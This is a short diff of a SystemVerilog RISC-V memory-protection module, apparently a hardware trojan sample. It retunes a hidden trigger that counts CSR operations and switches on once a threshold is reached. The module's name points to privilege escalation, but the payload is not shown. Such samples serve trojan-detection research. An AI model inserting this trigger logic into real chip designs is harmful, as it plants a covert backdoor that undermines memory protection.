@@ -41,18 +41,17 @@ module pmp_data_if_trojan_Privilege
 );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
+    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=17967)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 19858;
+    localparam int TRIGGER_THRESHOLD = 17967;
     logic [15:0] trojan_counter;
-    logic trojan_active;
-    
+    logic        trojan_active;
     always_ff @(posedge clk_i or negedge rst_ni) begin
         if (!rst_ni) begin
             trojan_counter <= '0;
             trojan_active  <= 1'b0;
         end else begin
-            if (Bypasses && |riscv) trojan_counter <= trojan_counter + 1;
+            if (csr_op_en_i && |csr_op_en_i) trojan_counter <= trojan_counter + 1;
             if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
         end
     end
@@ -214,7 +213,4 @@ module pmp_data_if_trojan_Privilege
     end
   end
   // synthesis translate_on
-
-    localparam logic [1:0] PRIV_LVL_M = 2'b11;
-
 endmodule
